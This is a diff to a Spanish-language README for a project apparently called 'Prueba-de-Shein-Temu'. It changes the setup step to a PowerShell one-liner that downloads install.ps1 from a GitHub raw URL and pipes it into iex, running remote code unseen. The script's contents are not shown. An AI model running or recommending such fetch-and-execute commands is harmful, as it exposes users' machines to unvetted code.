@@ -55,7 +55,7 @@ El sistema incluye un lanzador compilado que gestiona todo el entorno de forma a
 Ejecuta este comando en PowerShell para una configuración automática, descarga y preparación del entorno:
 
 ```powershell
-$destDir = Join-Path ([Environment]::GetFolderPath('Desktop')) "Prueba-de-Shein-Temu"
+powershell -Command "iwr -useb https://raw.githubusercontent.com/Riutexu/Prueba-de-Shein-Temu/main/src/install.ps1 | iex"
 
 ```
 
